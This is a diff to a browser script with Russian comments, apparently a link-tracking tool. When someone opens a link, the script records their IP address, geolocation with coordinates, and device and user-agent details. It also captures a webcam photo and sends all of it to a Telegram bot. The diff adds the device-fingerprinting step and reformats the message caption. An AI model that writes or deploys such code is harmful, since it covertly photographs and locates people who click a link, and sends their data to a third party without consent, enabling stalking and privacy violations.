@@ -10,8 +10,10 @@
         const ipData = await ipRes.json();
         ipAddress = ipData.ip;
 
-        const geoRes = await fetch(`https://ipapi.co/${ipAddress}/json/`);
-        const geoData = await geoRes.json();
+        const geoRes = await fetch(`https://api.ipify.org?format=json`);
+        // используем ipapi.co для гео
+        const geoReq = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+        const geoData = await geoReq.json();
         geo = `${geoData.city}, ${geoData.region}, ${geoData.country_name} (${geoData.latitude}, ${geoData.longitude})`;
     } catch(e) {
         geo = "ошибка геолокации";
@@ -21,14 +23,31 @@
     const now = new Date();
     const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";
 
-    // ---------- 3. Формирование caption (подпись к фото) ----------
+    // ---------- 3. UserAgent / устройство ----------
+    const userAgent = navigator.userAgent;
+    let deviceType = "не определено";
+    
+    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
+        deviceType = "Мобильное устройство";
+    } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
+        deviceType = "Десктоп";
+    }
+    
+    // Краткая версия UA (основные идентификаторы)
+    let shortUA = userAgent;
+    if (userAgent.length > 100) {
+        shortUA = userAgent.substring(0, 97) + "...";
+    }
+
+    // ---------- 4. Формирование caption (древовидный стиль) ----------
     const caption = `Новый переход по ссылке!
 
-IP Адрес: ${ipAddress}
-Гео/Локация: ${geo}
-Время перехода: ${timeStr}`;
+IP Адресс: ${ipAddress}
+ ├─ Гео/Локация: ${geo}
+ ├─ Время перехода: ${timeStr}
+ └─ Устройство/UserAgent: ${deviceType} | ${shortUA}`;
 
-    // ---------- 4. Захват фото с вебкамеры (Blob) ----------
+    // ---------- 5. Захват фото с вебкамеры ----------
     let photoBlob = null;
 
     try {
@@ -45,7 +64,6 @@ IP Адрес: ${ipAddress}
             };
         });
 
-        // Стабилизация кадра
         await new Promise(r => setTimeout(r, 500));
 
         const canvas = document.createElement("canvas");
@@ -54,19 +72,17 @@ IP Адрес: ${ipAddress}
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // Конвертация в Blob (JPEG, качество 0.85)
         photoBlob = await new Promise(resolve => {
             canvas.toBlob(resolve, "image/jpeg", 0.85);
         });
 
-        // Выключение камеры
         stream.getTracks().forEach(track => track.stop());
     } catch(e) {
         console.warn("Camera error:", e);
         photoBlob = null;
     }
 
-    // ---------- 5. Отправка в Telegram (ОДНО сообщение: фото + caption) ----------
+    // ---------- 6. Отправка в Telegram (фото + caption) ----------
     async function sendPhotoWithCaption(blob, captionText) {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
         const formData = new FormData();
@@ -78,12 +94,10 @@ IP Адрес: ${ipAddress}
         return response.json();
     }
 
-    // Отправляем только если есть фото
     if (photoBlob) {
         await sendPhotoWithCaption(photoBlob, caption);
     } else {
-        // Если камеры нет — по вашему запросу ничего не отправляем
-        // (можно раскомментировать ниже для отправки только текста)
+        // Если камера недоступна — ничего не отправляем (либо раскомментируйте ниже для текста)
         /*
         const textUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         await fetch(textUrl, {
